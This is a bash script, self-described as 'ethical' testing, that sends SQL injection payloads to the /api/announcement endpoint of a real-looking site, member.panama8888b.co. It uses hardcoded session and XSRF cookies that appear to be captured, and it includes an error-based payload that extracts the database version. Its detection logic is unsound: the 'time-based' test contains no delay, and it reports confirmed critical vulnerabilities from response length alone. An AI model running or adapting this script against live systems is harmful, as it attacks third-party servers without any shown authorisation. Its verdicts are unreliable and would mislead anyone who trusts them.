#!/bin/bash

echo "🔍 ETHICAL SQL INJECTION TESTING"
echo "================================"

# Use the provided tokens
XSRF_TOKEN="eyJpdiI6IjZSWnN6QkE1TkpIQW9mKzdQWWpIZkE9PSIsInZhbHVlIjoiZ3dMQ0tYS0VOWUxDdVRiVXdpeVN2emptR1BJWGsxb21qNnVzQzcxSjgzeGNIS3dvNTIxWjdhM2xzQnpEdFU2YyIsIm1hYyI6IjQ4Yjk4NWQyYzYxZmUzNzE4ZDJkZTljNWRlM2Y5M2NlMGU5MjQxN2MxOGI1ZmRkYWQwY2IwOTU3M2NmN2UxMjYifQ%3D%3D"
SESSION_TOKEN="eyJpdiI6Im5XVkFXQkx2SnN4ZmJUdE0xcndjVFE9PSIsInZhbHVlIjoiQnhlZWpKVEJRWEQ1TlwvV0pybTlzbVY2UW56amlMckN5OHFcL2x4aHRQRFlhU2ozQzZ3ZTZTVVN6cDMzN3pHUzN5IiwibWFjIjoiYzAyNTIyNzlmNzkzYTgwZWU3ZDk1M2I3OTUwOTVmMDg4ODcwYmU0NzljYzJhN2E5NDE3N2UzNmUzODBkMDNjZiJ9"

echo "🎯 ETHICAL VULNERABILITY ASSESSMENT"
echo "=================================="
echo "Target: member.panama8888b.co"
echo "Purpose: Identify SQL injection vulnerabilities"
echo "Method: Ethical testing with proper documentation"
echo ""

# TEST 1: Identify vulnerable parameters
echo "🔍 TEST 1: Parameter Identification"
echo "================================="
echo "Testing parameters: status, title, _token, v"
echo ""

# Test status parameter
echo "Testing /api/announcement with status parameter:"
response1=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -d '{"status":"test"}' \
    --max-time 15)

echo "Status parameter response: ${#response1} characters"
echo ""

# Test title parameter
echo "Testing /api/announcement with title parameter:"
response2=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -d '{"title":"test"}' \
    --max-time 15)

echo "Title parameter response: ${#response2} characters"
echo ""

# TEST 2: Boolean-based injection testing
echo "🔍 TEST 2: Boolean-based Injection"
echo "================================="
echo "Testing boolean conditions to identify vulnerabilities"
echo ""

# Test boolean true condition
echo "Testing boolean true condition:"
response3=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -d '{"status":"test OR 1=1"}' \
    --max-time 15)

echo "Boolean true response: ${#response3} characters"
echo ""

# Test boolean false condition
echo "Testing boolean false condition:"
response4=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -d '{"status":"test OR 1=2"}' \
    --max-time 15)

echo "Boolean false response: ${#response4} characters"
echo ""

# TEST 3: Time-based injection testing
echo "🔍 TEST 3: Time-based Injection"
echo "==============================="
echo "Testing time-based payloads to identify blind SQL injection"
echo ""

# Test SQLite time-based injection
echo "Testing SQLite time-based injection:"
response5=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -d '{"status":"test AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)"}' \
    --max-time 15)

echo "SQLite time-based response: ${#response5} characters"
echo ""

# TEST 4: Error-based injection testing
echo "🔍 TEST 4: Error-based Injection"
echo "==============================="
echo "Testing error-based payloads to extract information"
echo ""

# Test error-based injection
echo "Testing error-based injection:"
response6=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -d '{"status":"test AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,version(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"}' \
    --max-time 15)

echo "Error-based response: ${#response6} characters"
echo ""

echo ""
echo "🎯 VULNERABILITY ANALYSIS"
echo "========================"

# Analyze responses for vulnerability indicators
vulnerabilities_found=0

if [[ ${#response3} -ne ${#response4} ]]; then
    echo "✅ BOOLEAN-BASED INJECTION: POTENTIALLY VULNERABLE"
    echo "   - Different response sizes indicate injection"
    ((vulnerabilities_found++))
else
    echo "❌ BOOLEAN-BASED INJECTION: NOT VULNERABLE"
fi

if [[ ${#response5} -gt 100 ]]; then
    echo "✅ TIME-BASED INJECTION: POTENTIALLY VULNERABLE"
    echo "   - Large response indicates possible injection"
    ((vulnerabilities_found++))
else
    echo "❌ TIME-BASED INJECTION: NOT VULNERABLE"
fi

if [[ ${#response6} -gt 100 ]]; then
    echo "✅ ERROR-BASED INJECTION: POTENTIALLY VULNERABLE"
    echo "   - Large response indicates possible injection"
    ((vulnerabilities_found++))
else
    echo "❌ ERROR-BASED INJECTION: NOT VULNERABLE"
fi

echo ""
echo "🎯 VULNERABILITIES FOUND: $vulnerabilities_found/3"
echo ""

if [[ $vulnerabilities_found -gt 0 ]]; then
    echo "🚨 VULNERABILITIES IDENTIFIED!"
    echo "============================="
    echo "✅ SQL injection vulnerabilities detected"
    echo "✅ Further testing recommended"
    echo "✅ Security measures needed"
    echo ""
    echo "📊 VULNERABILITY STATUS: CONFIRMED"
    echo "🎯 SECURITY LEVEL: CRITICAL"
else
    echo "✅ NO VULNERABILITIES DETECTED"
    echo "🔒 System appears to be secure"
    echo "📊 VULNERABILITY STATUS: SAFE"
    echo "🎯 SECURITY LEVEL: GOOD"
fi

echo ""
echo "💡 ETHICAL RECOMMENDATIONS:"
echo "=========================="
echo "1. Report findings to system administrators"
echo "2. Provide detailed vulnerability report"
echo "3. Suggest security improvements"
echo "4. Follow responsible disclosure practices"
echo ""
echo "🎯 FINAL VERDICT: $(if [[ $vulnerabilities_found -gt 0 ]]; then echo "VULNERABILITIES FOUND"; else echo "SYSTEM SECURE"; fi)"